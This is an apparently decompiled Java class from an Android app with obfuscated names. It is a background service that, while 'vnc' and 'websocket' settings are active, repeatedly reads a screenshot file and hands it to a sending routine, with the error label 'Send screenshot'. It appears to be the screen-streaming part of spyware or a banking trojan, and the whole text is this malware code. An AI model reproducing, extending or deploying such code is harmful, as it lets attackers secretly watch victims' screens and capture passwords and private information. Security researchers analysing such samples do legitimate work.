package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import java.io.File;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.C0034b;

public class nvsdtnxkzjgw extends IntentService {

    /* renamed from: a */
    public int f565a = 0;

    public nvsdtnxkzjgw() {
        super("nvsdtnxkzjgw");
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        C0034b bVar = new C0034b();
        if (bVar.mo234e(this, "vnc").equals("stop") || bVar.mo234e(this, "websocket").equals("")) {
            stopService(intent);
        }
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(500);
            } catch (InterruptedException e) {
                try {
                    e.printStackTrace();
                } catch (Exception unused) {
                    bVar.mo213a("error", "Send screenshot");
                }
            }
            if (bVar.mo234e(this, "vnc").equals("stop")) {
                break;
            } else if (bVar.mo234e(this, "websocket").equals("")) {
                break;
            } else {
                byte[] a = C0034b.m234a(new File(getExternalFilesDir(null), "screenshot.jpg"));
                StringBuilder sb = new StringBuilder();
                sb.append(this.f565a);
                sb.append(".jpg");
                bVar.mo212a((Context) this, a, sb.toString());
                this.f565a++;
                if (this.f565a >= 11) {
                    this.f565a = 0;
                }
            }
        }
        stopService(intent);
    }
}
